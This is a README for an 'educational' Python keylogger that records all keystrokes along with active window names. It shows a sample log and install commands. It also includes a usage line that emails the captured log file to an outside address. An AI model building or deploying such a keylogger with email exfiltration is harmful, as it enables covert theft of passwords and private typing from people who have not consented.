# 🖥️ Python Keylogger (Educational Project)

A simple **modular keylogger in Python** that records keystrokes and also logs the **active application/window** where the typing happens.  
This project is for **learning purposes only** — to understand event listeners, file handling, modular design, and OS-level APIs.

⚠️ **Disclaimer:** This tool is strictly for **educational use on your own machine**.  
Misuse of keyloggers (e.g., stealing credentials, spying without consent) is **illegal** under computer misuse and cybercrime laws.

---

## 📂 Project Structure

```

keylogger\_project/
│── main.py              # Entry point (starts the keylogger)
│── requirements.txt      # Dependencies
│── README.md             # Project documentation
│
├── logger/
│   ├── __init__.py
│   ├── keylogger.py      # Core keylogger logic
│   └── utils.py          # Helper functions (formatting, window detection, saving)
│
└── storage/
    ├── __init__.py
    ├── file_handler.py   # Save keystrokes to file
    └── email_handler.py  # (Optional) Send logs via email

````

---

## ⚡ Features

- Captures **all keystrokes** using `pynput`
- Logs **active window/app name** whenever the user switches applications
- Saves logs to a text file (`keylogs.txt`)
- Modular structure for easy extension
- (Optional) Email sending feature with `storage/email_handler.py`

---

## 🚀 Usage

Run the keylogger:

```sh
python main.py
```

* Keystrokes will be saved in `keylogs.txt`
* Whenever the active window changes, the log will show:

```
=== Google Chrome ===
2025-08-22 12:10:01 - h
2025-08-22 12:10:02 - e
2025-08-22 12:10:03 - l
2025-08-22 12:10:04 - l
2025-08-22 12:10:05 - o
```

Press **ESC** to stop the program.

---

## 📦 Dependencies

* [pynput](https://pypi.org/project/pynput/) — capture keystrokes
* [pywin32](https://pypi.org/project/pywin32/) — get active window info (Windows only)

Install with:

```sh
pip install pynput pywin32
```

---

## 📧 (Optional) Email Logs

You can send the `keylogs.txt` file via email using the helper in `storage/email_handler.py`.
Example:

```python
from storage.email_handler import send_email_log

send_email_log("sender@gmail.com", "password", "receiver@gmail.com")
```

---

## 📚 Learning Outcomes

* Event listeners in Python (`pynput`)
* File handling and logging
* Detecting active applications/windows
* Modular project design
* Optional: sending emails with `smtplib`

---

## ⚠️ Disclaimer

This project is intended **only for educational purposes**.
Do **not** use this software on devices or accounts without **explicit permission**.
The author is not responsible for any misuse.

---